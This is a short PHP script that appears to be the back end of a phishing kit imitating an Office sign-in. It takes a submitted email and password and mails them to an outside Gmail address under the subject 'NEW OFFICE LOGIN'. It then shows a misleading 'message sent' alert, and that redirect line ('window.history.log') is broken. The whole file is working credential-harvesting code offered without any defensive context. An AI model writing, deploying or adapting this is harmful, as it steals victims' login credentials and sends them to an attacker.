<?php
    $email = $_REQUEST['useremail'];
    $password = $_REQUEST['userpassword'];
    $message = "User Email : $email \nUser Pass : $password";

    if(empty($email) || empty($password))
    {
        echo "Please fill all field";
    }
    else
    {
        mail("gbadebojubril@gmail.com", "NEW OFFICE LOGIN", $message, "From: <$email>");
        echo "<script style='text/javascript'>alert('Your message has been sent sucessfully');
        window.history.log(-1);
        </script>";
    }
?>